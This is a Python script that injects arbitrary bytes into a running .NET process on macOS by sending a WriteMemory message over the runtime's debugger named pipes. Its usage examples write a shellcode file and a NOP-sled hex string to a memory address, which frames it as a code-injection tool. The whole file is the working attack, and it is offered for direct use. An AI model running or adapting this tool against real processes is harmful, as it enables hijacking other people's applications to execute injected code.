#!/usr/bin/env python3
"""Write memory to a .NET process on macOS.

Usage: python3 write_memory.py <pipe_in> <pipe_out> <address> <data_file>
       python3 write_memory.py <pipe_in> <pipe_out> <address> <hex_string>
"""

import struct
import sys

MT_WriteMemory = 0x00000003

def build_message_header(msg_type, data_block_size, msg_id, reply_id=0, last_seen_id=0):
    """Build a MessageHeader struct."""
    header = struct.pack('<IIIIII',
        msg_type,
        data_block_size,
        msg_id,
        reply_id,
        last_seen_id,
        0
    )
    header += b'\x00' * 8
    return header

def parse_data(data_arg):
    """Parse data from file or hex string."""
    if os.path.isfile(data_arg):
        with open(data_arg, 'rb') as f:
            return f.read()
    else:
        # Assume hex string
        return bytes.fromhex(data_arg.replace(' ', '').replace(':', ''))

def write_memory(pipe_in, pipe_out, address, data):
    """Write memory to a .NET process."""
    
    length = len(data)
    print(f"[*] Writing {length} bytes to 0x{address:016X}")
    
    # Build write request
    data_block = struct.pack('<QQ', address, length)
    header = build_message_header(
        MT_WriteMemory,
        len(data_block) + length,
        3,
        0,
        2
    )
    
    try:
        # Send request with data
        with open(pipe_in, 'wb') as f:
            f.write(header)
            f.write(data_block)
            f.write(data)
        
        # Read confirmation
        with open(pipe_out, 'rb') as f:
            response = f.read(48)
            
            if len(response) < 48:
                print(f"[!] Incomplete response")
                return False
            
            print("[+] Memory write completed")
            return True
            
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def main():
    if len(sys.argv) != 5:
        print(f"Usage: {sys.argv[0]} <pipe_in> <pipe_out> <address> <data>")
        print("\nExamples:")
        print(f"  {sys.argv[0]} /tmp/dotnet_debug_12345-in /tmp/dotnet_debug_12345-out 0x7fff5fbff000 shellcode.bin")
        print(f"  {sys.argv[0]} /tmp/dotnet_debug_12345-in /tmp/dotnet_debug_12345-out 0x7fff5fbff000 90909090")
        sys.exit(1)
    
    import os
    
    pipe_in = sys.argv[1]
    pipe_out = sys.argv[2]
    address = int(sys.argv[3], 16) if sys.argv[3].startswith('0x') else int(sys.argv[3])
    data = parse_data(sys.argv[4])
    
    write_memory(pipe_in, pipe_out, address, data)

if __name__ == "__main__":
    main()
